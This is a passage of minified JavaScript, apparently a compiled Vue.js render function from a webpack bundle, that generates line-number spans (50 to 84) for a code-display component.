("span",{staticClass:"line-number"},[s._v("50")]),n("br"),n("span",{staticClass:"line-number"},[s._v("51")]),n("br"),n("span",{staticClass:"line-number"},[s._v("52")]),n("br"),n("span",{staticClass:"line-number"},[s._v("53")]),n("br"),n("span",{staticClass:"line-number"},[s._v("54")]),n("br"),n("span",{staticClass:"line-number"},[s._v("55")]),n("br"),n("span",{staticClass:"line-number"},[s._v("56")]),n("br"),n("span",{staticClass:"line-number"},[s._v("57")]),n("br"),n("span",{staticClass:"line-number"},[s._v("58")]),n("br"),n("span",{staticClass:"line-number"},[s._v("59")]),n("br"),n("span",{staticClass:"line-number"},[s._v("60")]),n("br"),n("span",{staticClass:"line-number"},[s._v("61")]),n("br"),n("span",{staticClass:"line-number"},[s._v("62")]),n("br"),n("span",{staticClass:"line-number"},[s._v("63")]),n("br"),n("span",{staticClass:"line-number"},[s._v("64")]),n("br"),n("span",{staticClass:"line-number"},[s._v("65")]),n("br"),n("span",{staticClass:"line-number"},[s._v("66")]),n("br"),n("span",{staticClass:"line-number"},[s._v("67")]),n("br"),n("span",{staticClass:"line-number"},[s._v("68")]),n("br"),n("span",{staticClass:"line-number"},[s._v("69")]),n("br"),n("span",{staticClass:"line-number"},[s._v("70")]),n("br"),n("span",{staticClass:"line-number"},[s._v("71")]),n("br"),n("span",{staticClass:"line-number"},[s._v("72")]),n("br"),n("span",{staticClass:"line-number"},[s._v("73")]),n("br"),n("span",{staticClass:"line-number"},[s._v("74")]),n("br"),n("span",{staticClass:"line-number"},[s._v("75")]),n("br"),n("span",{staticClass:"line-number"},[s._v("76")]),n("br"),n("span",{staticClass:"line-number"},[s._v("77")]),n("br"),n("span",{staticClass:"line-number"},[s._v("78")]),n("br"),n("span",{staticClass:"line-number"},[s._v("79")]),n("br"),n("span",{staticClass:"line-number"},[s._v("80")]),n("br"),n("span",{staticClass:"line-number"},[s._v("81")]),n("br"),n("span",{staticClass:"line-number"},[s._v("82")]),n("br"),n("span",{staticClass:"line-number"},[s._v("83")]),n("br"),n("span",{staticClass:"line-number"},[s._v("84")]),n("br")])])],1)}),[],!1,null,null,null);t.default=e.exports}}]);